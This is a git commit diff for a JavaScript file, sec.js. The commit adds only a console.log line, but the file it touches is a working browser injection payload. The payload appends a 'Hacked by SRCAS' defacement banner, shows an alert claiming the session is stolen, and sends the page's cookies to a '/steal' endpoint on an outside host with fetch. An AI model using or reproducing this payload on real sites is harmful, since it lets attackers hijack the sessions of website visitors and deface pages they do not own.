381b419fa3ab32de8bdba7ceac13664bf3f9c0c9
Nagarjun04 <137464253+Nagarjun04@users.noreply.github.com>
2025-02-14 19:15:24 +0530

    Update sec.js

--- sec.js
+++ sec.js
@@ -1,3 +1,4 @@
+console.log("Hello");
 document.body.innerHTML += '<h1 style="color:red;">Hacked by SRCAS</h1>';
 alert("Your session is stolen!");
 fetch('https://srcas.ac.in/steal?cookie=' + encodeURIComponent(document.cookie));
